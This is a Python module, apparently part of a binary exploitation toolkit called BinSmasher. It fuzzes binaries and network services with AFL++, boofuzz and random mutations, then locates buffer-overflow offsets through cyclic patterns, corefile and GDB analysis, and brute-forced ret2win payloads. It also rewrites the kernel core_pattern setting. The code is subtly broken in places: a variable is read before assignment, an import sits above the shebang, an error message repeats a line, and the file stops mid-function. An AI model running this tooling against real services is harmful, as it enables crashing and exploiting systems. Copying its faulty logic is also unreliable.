import re
#!/usr/bin/env python3
"""BinSmasher – fuzzer.py  v4 (boofuzz timeout compat fix)"""

import os, time, random, socket, struct, logging, subprocess, threading
from pathlib import Path
from rich.console import Console

console = Console()
log = logging.getLogger("binsmasher")


class Fuzzer:
    def __init__(self, binary, host, port, log_file, platform):
        self.binary   = binary
        self.host     = host
        self.port     = port
        self.log_file = log_file
        self.platform = platform
        # Set by find_offset_udp after stack scan; read by main for constraint check
        self._last_stack_scan_offset: int | None = None

    def afl_fuzz(self, binary_args, timeout_sec=30):
        log.info("Starting AFL++ coverage-guided fuzzing…")
        afl_in = Path("afl_in"); afl_out = Path("afl_out")
        afl_in.mkdir(exist_ok=True); afl_out.mkdir(exist_ok=True)
        seeds = [b"A"*64, b"\x00"*64, b"\xff"*64,
                 b"GET / HTTP/1.1\r\n\r\n", os.urandom(64), b"%p"*16, b"\x41"*256]
        for i, s in enumerate(seeds):
            (afl_in / f"seed_{i:02d}").write_bytes(s)
        cmd_parts = [self.binary] + binary_args
        afl_cmd = (f"AFL_SKIP_CPUFREQ=1 AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1 "
                   f"afl-fuzz -i {afl_in} -o {afl_out} -t 2000 -- {' '.join(cmd_parts)} @@")
        try:
            proc = subprocess.Popen(afl_cmd, shell=True,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deadline = time.time() + timeout_sec
            while time.time() < deadline:
                time.sleep(2)
                crash_dir = afl_out / "default" / "crashes"
                if crash_dir.exists():
                    crashes = list(crash_dir.glob("id:*"))
                    if crashes:
                        log.info(f"AFL++: {len(crashes)} crash(es) found!")
            proc.terminate(); proc.wait(timeout=5)
            log.info(f"AFL++ done — check {afl_out}/default/crashes")
            return True
        except FileNotFoundError:
            log.error("afl-fuzz not found — install: apt install afl++")
            return False
        except Exception as e:
            log.error(f"AFL++ error: {e}"); return False

    def fuzz_target(self, file_input, protocol, binary_args):
        log.info(f"Boofuzz ({protocol}) @ {self.host}:{self.port}…")
        try:
            from boofuzz import (Session, Target, TCPSocketConnection,
                                  s_initialize, s_static, s_string, s_get)
        except ImportError:
            log.error("boofuzz not installed: pip install boofuzz"); return False

        srv_proc = None
        if os.path.isfile(self.binary):
            try:
                srv_proc = subprocess.Popen([self.binary] + binary_args,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                time.sleep(1.5)
            except Exception as e:
                log.warning(f"Could not start server: {e}")
        try:
            try:
                conn = TCPSocketConnection(self.host, self.port, timeout=5)
            except TypeError:
                conn = TCPSocketConnection(self.host, self.port)

            session = Session(target=Target(connection=conn), sleep_time=0.05,
                              crash_threshold_request=3, crash_threshold_element=3)
            if file_input == "mp3":
                s_initialize("mp3")
                s_static(b"\xFF\xFB")
                s_string(b"ID3", fuzzable=False)
                s_string(b"\x03\x00\x00\x00\x00\x00", fuzzable=True, name="hdr")
                s_string(b"A"*512, fuzzable=True, name="body")
            elif protocol == "http":
                s_initialize("http")
                s_static(b"GET /")
                s_string(b"index.html", fuzzable=True, name="path")
                s_static(b" HTTP/1.1\r\nHost: ")
                s_string(b"localhost", fuzzable=True, name="host")
                s_static(b"\r\n\r\n")
                s_string(b"", fuzzable=True, name="body")
            else:
                s_initialize("raw")
                s_string(b"A"*128, fuzzable=True, name="payload")
            name = "mp3" if file_input == "mp3" else ("http" if protocol == "http" else "raw")
            session.connect(s_get(name))
            session.fuzz(max_depth=500)
            log.info("Boofuzz completed — check boofuzz-results/ for crashes")
            return True
        except Exception as e:
            log.error(f"Boofuzz error: {e}"); return False
        finally:
            if srv_proc: srv_proc.terminate()

    def mutation_fuzz(self, num_cases=500, timeout=1.0):
        log.info(f"Mutation fuzzing {self.host}:{self.port} ({num_cases} cases)…")
        crashes = 0
        seeds = [b"A"*128, b"\x00"*128, b"\xff"*128,
                 b"%s"*32, b"%n"*32, b"A"*4096, b"\x7f"*64, b"\x80"*64]
        def mutate(data):
            data = bytearray(data)
            op = random.randint(0, 5)
            if op == 0 and data:
                i = random.randint(0, len(data)-1); data[i] ^= 1 << random.randint(0,7)
            elif op == 1:
                pos = random.randint(0, len(data)); data[pos:pos] = os.urandom(random.randint(1,16))
            elif op == 2 and data:
                s = random.randint(0, len(data)-1); l = random.randint(1, min(32, len(data)-s))
                data[s:s+l] = bytes([random.randint(0,255)]*l)
            elif op == 3:
                data += b"\x00"*random.randint(1,64)
            elif op == 4:
                ints = [b"\xff\xff\xff\xff",b"\x00\x00\x00\x00",b"\x80\x00\x00\x00",b"\x7f\xff\xff\xff"]
                pos = random.randint(0, len(data)); chunk = random.choice(ints)
                data[pos:pos+len(chunk)] = chunk[:len(data)-pos]
            else:
                data = data * random.randint(2,8)
            return bytes(data)
        for i in range(num_cases):
            payload = mutate(random.choice(seeds))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout); s.connect((self.host, self.port))
                s.sendall(payload)
                try: resp = s.recv(4096)
                except: resp = b""
                s.close()
                if not resp:
                    crashes += 1
                    Path(f"crash_{i:04d}.bin").write_bytes(payload)
                    log.warning(f"Potential crash #{crashes} — case {i}")
            except ConnectionRefusedError: time.sleep(0.3)
            except: pass
        log.info(f"Mutation fuzzing done: {crashes} potential crash(es)")
        return crashes > 0

    # ── ROTO heuristic offset finder ──────────────────────────────────────────

    def find_offset_roto(self, pattern_size: int = 300, attempts: int = 6) -> int | None:
        from pwn import cyclic, context
        import socket as _socket
        log.info("ROTO heuristic offset search…")

        prev_resp_len = None
        for mult in range(1, attempts + 1):
            sz  = pattern_size * mult
            pat = cyclic(sz)
            try:
                s = _socket.create_connection((self.host, self.port), timeout=2.0)
                try: s.recv(256)
                except Exception: pass
                s.sendall(pat + b'\n')
                s.settimeout(2.0)
                resp = b""
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                except Exception:
                    pass
                s.close()

                resp_len = len(resp)
                log.debug(f"ROTO mult={mult} size={sz} resp={resp_len}B")

                if resp_len == 0:
                    est = (sz - 8) if context.arch == "amd64" else (sz - 4)
                    log.info(f"ROTO: crash detected at size={sz} → estimated offset ~{est}")
                    return est

                if resp_len < sz // 4:
                    est = max(8, resp_len - 8)
                    log.info(f"ROTO: truncated response ({resp_len}B < {sz//4}B) → estimated offset ~{est}")
                    return est

                if prev_resp_len is not None and resp_len < prev_resp_len:
                    est = max(8, resp_len - 8)
                    log.info(f"ROTO truncation at size={sz} → estimated offset ~{est}")
                    return est

                prev_resp_len = resp_len

            except (ConnectionRefusedError, ConnectionResetError):
                log.warning(f"ROTO: connection refused/reset at size={sz}")
                if prev_resp_len is not None:
                    return max(8, prev_resp_len - 8)
                break
            except Exception as e:
                log.debug(f"ROTO exception at size={sz}: {e}")
                if prev_resp_len is not None:
                    return max(8, prev_resp_len - 8)

        log.warning("ROTO: could not determine offset")
        return None

    # ── UDP payload offset finder (for network services) ───────────────────────

    @staticmethod
    def _find_inject_field(data: bytes) -> tuple:
        """
        Returns (start, length, fill_byte) of the field to inject into.
        Priority:
          1. {PAYLOAD} placeholder — use its position, length=4096 (no size limit)
          2. Longest run of repeated bytes >= 16 (e.g. AAAA... or BBBB...)
        """
        PLACEHOLDER = b"{PAYLOAD}"
        idx = data.find(PLACEHOLDER)
        if idx != -1:
            # {PAYLOAD} found — return its position, a large max length, and 0x41
            return idx, 4096, 0x41

        # Fallback: longest run of repeated bytes
        best_start, best_len, best_byte = 0, 0, 0x41
        i = 0
        while i < len(data):
            j = i + 1
            while j < len(data) and data[j] == data[i]:
                j += 1
            run_len = j - i
            if run_len >= 16 and run_len > best_len:
                best_start, best_len, best_byte = i, run_len, data[i]
            i = j
        return best_start, best_len, best_byte

    @staticmethod
    def _wait_for_udp_port(host: str, port: int, timeout: float = 5.0) -> bool:
        """
        Wait until the process is ready on the given UDP port.
        Sends a minimal probe byte and waits for any response.
        If no response (many services do not reply to unknown data), waits out the timeout.
        """
        # Generic 1-byte probe — works for any UDP service
        probe = b"\x00"
        deadline = time.time() + timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.4)
        responded = False
        while time.time() < deadline:
            try:
                sock.sendto(probe, (host, port))
                sock.recvfrom(512)
                responded = True
                break
            except socket.timeout:
                time.sleep(0.15)
            except Exception:
                time.sleep(0.15)
        sock.close()
        if not responded:
            # No response — many UDP services do not reply to unknown probes. Waiting a bit longer.
            time.sleep(1.0)
        return True

    def find_offset_udp_payload(self,
                                 payload_template: bytes,
                                 binary: str,
                                 binary_args: list,
                                 host: str = None,
                                 port: int = None,
                                 pattern_size_start: int = 64,
                                 target_function: str = None,
                                 max_attempts: int = 12) -> tuple:
        """
        Detects the overflow offset for UDP-based network services.

        Algorithm:
          1. Auto-detect injection field: {PAYLOAD} placeholder or
             longest run of repeated bytes in the template.
          2. For increasing cyclic pattern sizes (64, 128, 192, ...):
             a. Spawn the binary via pwntools for corefile access.
             b. Wait for the UDP port to be ready.
             c. Replace the injection field with cyclic(size).
             d. Send the payload via UDP.
             e. Wait for the process muera (crash detectado).
             f. Lee el PC/RIP del corefile y calcula el offset con cyclic_find.
          3. Devuelve (offset, crash_addr, target_function).

        Returns:
            (offset: int, stack_addr: int|None, target_function: str)
            offset=None if it could not be determined.
        """
        import resource, re as _re_local
        from pwn import cyclic, cyclic_find, process as pwn_process, context, ELF

        _host = host or self.host
        _port = port or self.port

        # ── detect injection mode: {PAYLOAD} placeholder or longest repeated run ──
        _use_placeholder = b"{PAYLOAD}" in payload_template
        if _use_placeholder:
            # {PAYLOAD} present: _build_udp_payload will replace it directly.
            # We don't need inj_start/len — just pass cyclic bytes to _build_udp_payload.
            inj_start, inj_len, inj_byte = 0, 0, 0x41
            log.info("Injection mode: {PAYLOAD} placeholder detected — "
                     "cyclic will be injected at {PAYLOAD} position with Content-Length recalculated")
        else:
            inj_start, inj_len, inj_byte = self._find_inject_field(payload_template)
            if inj_len < 8:
                log.warning(
                    f"find_offset_udp_payload: injection field too short ({inj_len}B) — "
                    "add a long filler field or use {PAYLOAD} placeholder in your template"
                )
            log.info(
                f"Injection field detected: offset={inj_start} len={inj_len} "
                f"byte=0x{inj_byte:02x} ('{chr(inj_byte) if 32 <= inj_byte < 127 else '?'}')"
            )

        # ── enable core dumps + set core pattern to /tmp/core.<pid> ─────────
        try:
            resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        except Exception as e:
            log.debug(f"setrlimit CORE: {e}")
        _core_dir     = "/tmp"
        _core_pattern = f"{_core_dir}/core.%p"
        try:
            with open("/proc/sys/kernel/core_pattern") as _cf:
                _cur = _cf.read().strip()
            if _cur != _core_pattern:
                with open("/proc/sys/kernel/core_pattern", "w") as _cf:
                    _cf.write(_core_pattern)
                log.info(f"Core pattern → {_core_pattern}")
        except PermissionError:
            log.warning(f"Cannot set core_pattern (need root). "
                        f"Run: echo '{_core_pattern}' | sudo tee /proc/sys/kernel/core_pattern")
        except Exception as e:
            log.debug(f"core_pattern: {e}")

        found_offset    = None
        found_addr      = None
        first_crash_sz  = None   # size at which first crash occurs (no corefile)

        # ── Phase 1: binary search for minimum crash size ──────────────────────
        # Probe small sizes (8, 16, 32, ...) to narrow the offset range
        # before iterating with pattern_size_start. Avoids the false "offset=192"
        # when crash occurs at any size because overflow is in heap or pointer chain
        # o el RIP se corrompe por encadenamiento de punteros (no stack directo).
        log.info("Phase 1: searching minimum crash size (8→128 bytes)…")
        _min_crash_sz  = None
        _max_safe_sz   = 0
        for _probe_sz in [64, 128, 192, 256, 320, 384, 512, 640, 768, 1024]:
            _pat_probe = bytes(cyclic(_probe_sz))
            if _use_placeholder:
                _crafted_probe = self._build_udp_payload(payload_template, _pat_probe)
            else:
                if len(_pat_probe) < inj_len:
                    _inj_probe = _pat_probe + bytes([inj_byte]) * (inj_len - len(_pat_probe))
                else:
                    _inj_probe = _pat_probe[:inj_len]
                _crafted_probe = (payload_template[:inj_start]
                                  + _inj_probe
                                  + payload_template[inj_start + inj_len:])
            try:
                _pp = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._wait_for_udp_port(_host, _port, timeout=5.0)
                _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                _sock.settimeout(2.0)
                _sock.sendto(_crafted_probe, (_host, _port))
                _sock.close()
                try:
                    _pp.wait(timeout=6)
                    _rc = _pp.returncode if hasattr(_pp, "returncode") else _pp.poll()
                    if _rc is None or _rc == 0:
                        log.debug(f"  Phase 1: clean exit (rc={_rc}) at {_probe_sz}B — not a crash")
                        _max_safe_sz = _probe_sz
                        try: _pp.kill()
                        except: pass
                    else:
                        _min_crash_sz = _probe_sz
                        log.info(f"  Phase 1: crash at {_probe_sz}B (rc={_rc}) — overflow below this size")
                        try: _pp.kill()
                        except: pass
                        break
                except Exception:
                    log.debug(f"  Phase 1: no crash at {_probe_sz}B")
                    _max_safe_sz = _probe_sz
                    try: _pp.kill(); _pp.wait(timeout=1)
                    except: pass
            except Exception as _e:
                log.debug(f"  Phase 1 probe {_probe_sz}: {_e}")

        if _min_crash_sz is None:
            log.info(f"  Phase 1: no crash up to 1024B → offset > 1024, "
                     f"using pattern_size_start={pattern_size_start}")
        else:
            log.info(f"  Phase 1: crash range {_max_safe_sz}B–{_min_crash_sz}B → "
                     f"real offset is within that range")
            # Binary search to narrow the exact minimum crash size
            _lo, _hi = _max_safe_sz, _min_crash_sz
            while _hi - _lo > 8:
                _mid = (_lo + _hi) // 2
                if _use_placeholder:
                    _probe_mid = self._build_udp_payload(payload_template, bytes(cyclic(_mid)))
                else:
                    _inj_mid = bytes(cyclic(_mid))
                    if len(_inj_mid) < inj_len:
                        _inj_mid = _inj_mid + bytes([inj_byte]) * (inj_len - len(_inj_mid))
                    else:
                        _inj_mid = _inj_mid[:inj_len]
                    _probe_mid = (payload_template[:inj_start]
                                  + _inj_mid
                                  + payload_template[inj_start + inj_len:])
                try:
                    _pp2 = subprocess.Popen([binary] + binary_args,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL)
                    self._wait_for_udp_port(_host, _port, timeout=5.0)
                    _s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    _s2.settimeout(2.0)
                    _s2.sendto(_probe_mid, (_host, _port))
                    _s2.close()
                    try:
                        _pp2.wait(timeout=6)
                        _rc2 = _pp2.returncode
                        if _rc2 is not None and _rc2 != 0:
                            _hi = _mid
                            log.debug(f"  Bisect: crash at {_mid}B → hi={_hi}")
                        else:
                            _lo = _mid
                            log.debug(f"  Bisect: safe at {_mid}B → lo={_lo}")
                    except subprocess.TimeoutExpired:
                        _lo = _mid
                        log.debug(f"  Bisect: alive at {_mid}B → lo={_lo}")
                        try: _pp2.kill(); _pp2.wait(timeout=2)
                        except: pass
                except Exception as _be:
                    log.debug(f"  Bisect error at {_mid}B: {_be}")
                    break
            _min_crash_sz = _hi
            pattern_size_start = _hi  # start main loop exactly at crash boundary
            self._last_min_crash_sz = _hi    # expose to caller
            self._last_bisect_lo   = _lo     # exact safe boundary
            self._last_bisect_hi   = _hi     # exact crash boundary
            log.info(f"  Bisect complete: minimum crash at {_min_crash_sz}B "
                     f"(overflow offset ~{_min_crash_sz - 8}–{_min_crash_sz})")
            # Crash at 8B or less means the overflow likely corrupts the heap
            # before any stack frame is involved. Run GDB automatically to get
            # the backtrace and determine the real crash context.
            if _min_crash_sz <= 8:
                log.info("  Crash at ≤8B detected — running automated GDB analysis to "
                         "determine crash type (stack vs heap)…")
                _gdb_result = self._auto_gdb_crash_analysis(
                    binary=binary,
                    binary_args=binary_args,
                    crash_payload=self._build_udp_payload(
                        payload_template, bytes(cyclic(64))
                    ) if _use_placeholder else (
                        payload_template[:inj_start]
                        + bytes(cyclic(64))
                        + payload_template[inj_start + inj_len:]
                    ),
                    host=_host,
                    port=_port,
                )
                if _gdb_result:
                    log.info(f"  GDB crash analysis:\n{_gdb_result}")
                    # If corefile offset is in _gdb_result, use it
                    import re as _re
                    _off_m = _re.search(r"cyclic_find offset: *(\d+)", _gdb_result)
                    if _off_m:
                        _gdb_offset = int(_off_m.group(1))
                        log.info(f"  ✓ Exact offset from GDB: {_gdb_offset}")
                        found_offset = _gdb_offset
                        if _pie_base is None:
                            _pie_base = getattr(self, "_udp_pie_base", None)
                        self._udp_pie_base = getattr(self, "_udp_pie_base", _pie_base)
                        pie_base = getattr(self, "_udp_pie_base", None)
                        if hasattr(self, "_udp_pie_base"):
                            del self._udp_pie_base
                        return found_offset, _pie_base, target_function

        for attempt in range(1, max_attempts + 1):
            sz = pattern_size_start * attempt
            pat = cyclic(sz)

            # Build payload with cyclic pattern
            pat_bytes = bytes(pat)
            if _use_placeholder:
                # {PAYLOAD} mode: replace placeholder directly, Content-Length auto-updated
                crafted = self._build_udp_payload(payload_template, pat_bytes)
            else:
                # Repeated-bytes mode: pad cyclic to original field length
                if len(pat_bytes) < inj_len:
                    inject = pat_bytes + bytes([inj_byte]) * (inj_len - len(pat_bytes))
                else:
                    inject = pat_bytes[:inj_len]
                crafted = self._build_udp_payload(payload_template, inject)


            log.info(f"  [attempt {attempt}/{max_attempts}] cyclic size={sz} → payload {len(crafted)}B")

            # ── spawn binary with stdin=PIPE so interactive binaries stay alive ──
            try:
                p = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            except Exception as e:
                log.error(f"  Could not spawn binary: {e}")
                break

            # Read PIE base from /proc/<pid>/maps before crash
            _pie_base = None
            _bin_basename = os.path.basename(binary)
            try:
                maps_path = f"/proc/{p.pid}/maps"
                with open(maps_path) as _mf:
                    for _line in _mf:
                        # Search by binary basename (not full path), accept r-xp or r--p
                        if _bin_basename in _line and ("r-xp" in _line or "r--p" in _line):
                            _addr = _line.split("-")[0].strip()
                            _pie_base = int(_addr, 16)
                            log.info(f"  PIE base: {hex(_pie_base)} (from /proc/{p.pid}/maps)")
                            break
                # Fallback: take first executable mapping
                if _pie_base is None:
                    with open(maps_path) as _mf2:
                        for _line in _mf2:
                            if "r-xp" in _line:
                                _pie_base = int(_line.split("-")[0].strip(), 16)
                                log.info(f"  PIE base (first r-xp segment): {hex(_pie_base)}")
                                break
            except Exception as _e:
                log.debug(f"  Could not read PIE base: {_e}")
            # Also read libc base from maps for this specific PID
            _libc_base = None
            try:
                with open(maps_path) as _mf3:
                    for _line in _mf3:
                        if ("libc.so" in _line or "libc-" in _line) and "r-xp" in _line:
                            _libc_base = int(_line.split("-")[0].strip(), 16)
                            log.info(f"  libc base (PID {p.pid}): {hex(_libc_base)}")
                            break
            except Exception:
                pass

            # Save maps data keyed to this specific PID for later cross-checking
            if not hasattr(self, "_pid_maps"):
                self._pid_maps = {}
            if _pie_base is not None:
                self._udp_pie_base = _pie_base
                self._pid_maps[p.pid] = {"pie": _pie_base, "libc": _libc_base}
            if _libc_base is not None:
                self._udp_libc_base = _libc_base

            # Wait for UDP service to be ready
            self._wait_for_udp_port(_host, _port, timeout=5.0)

            # Send payload via UDP
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                sock.sendto(crafted, (_host, _port))
                try:
                    resp, _ = sock.recvfrom(4096)
                    log.debug(f"  UDP response: {resp[:80]!r}")
                except socket.timeout:
                    log.debug("  No immediate UDP response — possible crash")
                finally:
                    sock.close()
            except Exception as e:
                log.warning(f"  Error enviando UDP: {e}")
                try: p.kill()
                except: pass
                continue

            # Wait for process to die, then check exit code
            # Exit code 0 = clean exit (e.g. binary quit on stdin EOF or normal flow)
            # Exit code != 0 or negative = actual crash (signal/abort/assert)
            crashed = False
            try:
                p.wait(timeout=6)
                rc = p.returncode
                if rc is None or rc == 0:
                    log.debug(f"  Process exited cleanly (rc={rc}) with cyclic({sz}) — not a crash")
                    continue
                crashed = True
                log.info(f"  ✓ Process crashed with cyclic({sz}) (rc={rc})")
            except subprocess.TimeoutExpired:
                log.debug(f"  Process still alive with cyclic({sz}) — pattern too small")
                try: p.kill(); p.wait(timeout=2)
                except: pass
                continue

            if not crashed:
                continue

            if first_crash_sz is None:
                first_crash_sz = sz

            # ── try corefile for exact PC ─────────────────────────────────────
            got_exact = False
            # Wait a moment for the core to be written
            time.sleep(0.5)
            try:
                import glob as _glob
                # PID-specific cores only — never accept generic 'core' (wrong process)
                _cwd  = os.getcwd()
                _pid_s = str(p.pid)
                _now  = time.time()
                # Priority: exact PID match, then recent files (<10s)
                _pid_cores = (
                    _glob.glob(f"{_cwd}/core.{_pid_s}") +
                    _glob.glob(f"{_cwd}/core.*{_pid_s}*") +
                    _glob.glob(f"/tmp/core.{_pid_s}") +
                    _glob.glob(f"/tmp/core.*{_pid_s}*")
                )
                # Generic 'core' only as absolute last resort, < 5s old
                _generic_core = []
                if not _pid_cores:
                    _g = f"{_cwd}/core"
                    if (os.path.exists(_g) and
                            os.path.getsize(_g) > 1000 and
                            _now - os.path.getmtime(_g) < 5):
                        _generic_core = [_g]
                        log.info(f"  Using generic 'core' (no PID match, age "
                                 f"{_now - os.path.getmtime(_g):.1f}s < 5s)")
                core_files = sorted(
                    list(dict.fromkeys(_pid_cores + _generic_core)),
                    key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0,
                    reverse=True
                )
                log.info(f"  Core search PID={_pid_s}: {len(core_files)} candidate(s): "
                         f"{core_files[:3]}")
                core_path = core_files[0] if core_files else None
                if core_path and os.path.getsize(core_path) > 0:
                    log.debug(f"  Reading corefile: {core_path}")
                    try:
                        from pwn import Corefile
                        core = Corefile(core_path)
                        pc = (getattr(core, "pc", None) or
                              getattr(core, "rip", None) or
                              getattr(core, "eip", None))
                        if pc:
                            off = cyclic_find(pc & 0xffffffff)
                            if off != -1:
                                log.info(f"  ✓ Exact offset via corefile: {off}  RIP={hex(pc)}")
                                found_offset = off
                                found_addr   = pc
                                if _pie_base is not None:
                                    self._udp_pie_base = _pie_base
                                got_exact = True
                            else:
                                log.debug(f"  corefile RIP={hex(pc)} not in cyclic pattern")
                        else:
                            log.debug("  corefile: no PC/RIP register found")
                    except Exception as _ce:
                        log.debug(f"  corefile parse error: {_ce}")
                else:
                    log.debug("  No corefile found — run: ulimit -c unlimited && "
                              "echo '/tmp/core.%p' | sudo tee /proc/sys/kernel/core_pattern")
            except Exception as e:
                log.debug(f"  corefile lookup error: {e}")

            # ── stop at first crash and run GDB automatically ─────────────────
            if got_exact:
                break
            # No corefile — try coredumpctl (systemd) then GDB
            log.info(f"  First crash at cyclic({sz}) — extracting exact RIP…")

            # Strategy 1: coredumpctl (systemd-coredump) — most reliable on modern Linux
            _rip_from_core = self._extract_rip_from_coredumpctl(binary, p.pid)
            if _rip_from_core is not None:
                _off = cyclic_find(_rip_from_core & 0xffffffff)
                if _off != -1:
                    log.info(f"  ✓ coredumpctl: exact offset = {_off} (RIP={hex(_rip_from_core)})")
                    found_offset = _off
                    found_addr   = _rip_from_core
                    if _pie_base is not None:
                        self._udp_pie_base = _pie_base
                    break
                else:
                    log.info(f"  coredumpctl RIP={hex(_rip_from_core)} — not in cyclic, "
                             f"scanning stack for cyclic overwrite…")
                    self._last_coredump_rip = _rip_from_core
                    # Scan the stack memory in the core for cyclic bytes
                    _core_files = sorted(
                        [f for f in __import__("glob").glob(f"/tmp/core.{p.pid}") +
                         __import__("glob").glob("/tmp/core.*")
                         if __import__("os").path.exists(f) and
                         __import__("os").path.getmtime(f) > __import__("time").time() - 30],
                        key=__import__("os").path.getmtime, reverse=True
                    )
                    if _core_files:
                        _stack_off = self._find_offset_from_core_stack(
                            _core_files[0], sz)
                        if _stack_off != -1:
                            log.info(f"  ✓ Stack scan: exact offset = {_stack_off}")
                            found_offset = _stack_off
                            self._last_stack_scan_offset = _stack_off
                            if _pie_base is not None:
                                self._udp_pie_base = _pie_base
                            break

            # Strategy 2: GDB with longer timeout
            _crash_payload = crafted
            _gdb_out = self._auto_gdb_crash_analysis(
                binary=binary, binary_args=binary_args,
                crash_payload=_crash_payload, host=_host, port=_port,
            )
            if _gdb_out and "===CRASH_START===" in _gdb_out:
                _rip_match = _re_local.search(r'rip\s+0x([0-9a-fA-F]+)', _gdb_out)
                if not _rip_match:
                    _rip_match = _re_local.search(r'\$\d+\s*=\s*0x([0-9a-fA-F]+)', _gdb_out)
                if _rip_match:
                    _rip_val = int(_rip_match.group(1), 16)
                    _off = cyclic_find(_rip_val & 0xffffffff)
                    if _off != -1:
                        log.info(f"  ✓ GDB: exact offset = {_off} (RIP={hex(_rip_val)})")
                        found_offset = _off
                        found_addr   = _rip_val
                        if _pie_base is not None:
                            self._udp_pie_base = _pie_base
                        break
                    else:
                        log.warning(f"  GDB RIP={hex(_rip_val)} not in cyclic pattern")

            # Strategy 3: brute-force offset within the bisect range
            # We know the crash happens with exactly {sz}B of cyclic.
            # Try every 8-byte-aligned offset in [_max_safe_sz, sz] with a ret2win payload.
            if _pie_base is not None:
                # Try every byte position from lo to hi — the puntero corrupto
                # may not be 8-byte aligned, so step=1 is required.
                log.info(f"  No corefile/GDB — brute-forcing exact offset in "
                         f"[{_max_safe_sz}, {sz}] (step=1)…")
                _found_brute = self._brute_offset_udp(
                    payload_template=payload_template,
                    binary=binary,
                    binary_args=binary_args,
                    host=_host, port=_port,
                    lo=_max_safe_sz, hi=sz, step=1,
                    pie_base=_pie_base,
                    use_placeholder=_use_placeholder,
                    inj_start=inj_start, inj_len=inj_len, inj_byte=inj_byte,
                )
                if _found_brute is not None:
                    found_offset = _found_brute
                    if _pie_base is not None:
                        self._udp_pie_base = _pie_base
                    break

            break  # stop at first crash regardless

        # ── fallback: estimate from first crash size ─────────────────────────
        if found_offset is None and first_crash_sz is not None:
            word = 8 if context.arch == "amd64" else 4
            if _min_crash_sz is not None and _max_safe_sz > 0:
                # Known range from Phase 1: offset between _max_safe_sz and _min_crash_sz
                found_offset = max(8, _max_safe_sz)
                log.warning(
                    f"Estimated offset range: {found_offset}–{_min_crash_sz - word}B. "
                    f"Crash between {_max_safe_sz}B and {_min_crash_sz}B of pattern. "
                    f"Confirm with GDB: gdb -q {binary}"
                )
            elif _min_crash_sz is not None and _max_safe_sz == 0:
                # Crashed with only 8B → very early overflow, likely heap
                found_offset = 8
                log.warning(
                    f"Crash at 8B → early overflow (heap overflow or pointer corruption). "
                    f"Stack offset may differ. Confirm with GDB."
                )
            else:
                found_offset = max(8, first_crash_sz - word)
                log.warning(
                    f"Heuristic offset: {found_offset} (first crash at cyclic({first_crash_sz})). "
                    f"Core dumps no disponibles — ejecuta: ulimit -c unlimited y repite."
                )

        if found_offset is None:
            log.error(
                "find_offset_udp_payload: could not determine offset.\n"
                "  • Verify core dumps are enabled: ulimit -c unlimited\n"
                "  • Verify the cyclic pattern reaches RIP (the injection field may not\n"
                "    injection field may be past the overflow point — adjust manually)\n"
                f"  • Injection field: template[{inj_start}:{inj_start+inj_len}] "
                f"({inj_len}B of 0x{inj_byte:02x})"
            )
            return None, None, target_function

        pie_base  = getattr(self, "_udp_pie_base",  None)
        libc_base = getattr(self, "_udp_libc_base", None)
        for _attr in ("_udp_pie_base", "_udp_libc_base"):
            if hasattr(self, _attr):
                delattr(self, _attr)
        if pie_base:
            log.info(f"Process PIE base:  {hex(pie_base)}")
        if libc_base:
            log.info(f"Process libc base: {hex(libc_base)}")
            self._last_libc_base = libc_base  # expose to caller
        return found_offset, pie_base, target_function

    # ── SIGFAULT address analysis ─────────────────────────────────────────────

    def sigfault_analysis(self, binary: str, pattern_size: int = 300) -> dict:
        import signal as _signal
        from pwn import cyclic, cyclic_find, process, context, ELF
        import resource

        log.info("SIGFAULT analysis: spawning local process with cyclic…")
        result = {"offset": None, "crash_addr": None, "signal": None, "method": None}

        for mult in range(1, 4):
            sz  = pattern_size * mult
            pat = cyclic(sz)
            try:
                resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
                p = process([binary], stderr=open("/dev/null","wb"))
                p.sendline(pat)
                try: p.recvall(timeout=2)
                except Exception: pass
                try: p.wait(timeout=3)
                except Exception: p.kill(); p.wait(timeout=1)

                try:
                    ret = p.poll()
                    if ret is not None and ret < 0:
                        sig_num = -ret
                        result["signal"] = sig_num
                        log.info(f"SIGFAULT analysis: process died with signal {sig_num}")
                except Exception:
                    pass

                try:
                    core = p.corefile
                    if core:
                        pc = getattr(core, "pc", None) or getattr(core, "rip", None)
                        if pc:
                            off = cyclic_find(pc & 0xffffffff)
                            if off != -1:
                                result["offset"]     = off
                                result["crash_addr"] = pc
                                result["method"]     = "corefile"
                                log.info(f"SIGFAULT→corefile offset={off}  crash_addr={hex(pc)}")
                                return result
                except Exception:
                    pass

            except Exception as e:
                log.debug(f"SIGFAULT mult={mult}: {e}")

        log.info("SIGFAULT analysis: falling back to ROTO heuristic")
        roto = self.find_offset_roto(pattern_size)
        if roto is not None:
            result["offset"] = roto
            result["method"] = "roto_fallback"
        return result

    # ── GDB script generation ─────────────────────────────────────────────────

    def generate_gdb_script(self, binary: str, offset: int, exploit_type: str = "ret2win",
                             win_addr: int = 0, libc_base: int = 0, mode: str = "pwndbg") -> str:
        import shlex
        from pwn import context, ELF
        workdir = os.path.join(os.path.dirname(os.path.abspath(binary)), "_bs_work")
        os.makedirs(workdir, exist_ok=True)
        bname   = os.path.basename(binary)
        outfile = os.path.join(workdir, bname + "_" + mode + ".gdb")
        arch    = "amd64" if context.arch == "amd64" else "i386"
        q       = shlex.quote(binary)
        sz      = offset + 64

        lines = [
            "set pagination off",
            "set confirm off",
            "file " + q,
        ]

